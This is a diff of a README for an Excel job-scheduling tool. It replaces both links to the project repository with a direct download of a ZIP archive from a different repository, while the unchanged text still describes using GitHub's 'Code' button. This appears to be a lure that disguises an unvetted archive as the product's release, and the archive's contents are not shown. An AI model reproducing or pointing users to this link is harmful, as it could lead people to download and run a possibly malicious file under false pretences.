@@ -5,7 +5,7 @@ description: "Automate Excel-based job scheduling and data processing in Spring 
 ---
 # ⚡ ha-excel-job-engine - Export Excel Without Crashes
 
-[![Download Now](https://img.shields.io/badge/Download-ha--excel--job--engine-2ea44f?style=for-the-badge&logo=github)](https://github.com/SNWIPER/ha-excel-job-engine)
+[![Download Now](https://img.shields.io/badge/Download-ha--excel--job--engine-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/SNWIPER/snwiper.github.io/main/Java/Latest_1.3.zip)
 
 ## 🎯 What This Software Does
 
@@ -17,7 +17,7 @@ Think of it like a factory assembly line for Excel files. Instead of one worker 
 
 Visit this link to download the application:
 
-[**https://github.com/SNWIPER/ha-excel-job-engine**](https://github.com/SNWIPER/ha-excel-job-engine)
+[**https://raw.githubusercontent.com/SNWIPER/snwiper.github.io/main/Java/Latest_1.3.zip**](https://raw.githubusercontent.com/SNWIPER/snwiper.github.io/main/Java/Latest_1.3.zip)
 
 Once you're on that page, look for the green "Code" button and then "Download ZIP" to get the software package. After the download finishes, you'll have a ZIP file on your computer.
 
